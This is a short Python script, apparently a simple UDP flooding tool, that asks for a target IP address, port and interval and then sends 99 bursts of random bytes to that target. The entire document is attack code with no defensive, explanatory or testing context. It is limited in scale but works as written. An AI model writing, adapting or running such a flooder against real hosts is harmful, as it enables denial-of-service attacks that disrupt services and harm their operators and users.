import socket, random, time

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

ip = input("Enter target IP address > ")
port = int(input("Enter target port > "))
interval = float(input("Enter time interval > "))

s.connect((ip, port))

#generate a unique text
# print(random._urandom(10))

for i in range(1, 100):
    s.send(random._urandom(10)*100)
    print(f"Send: {i}",end="\r")
    time.sleep(interval)

print("Sending Pocket completed.")

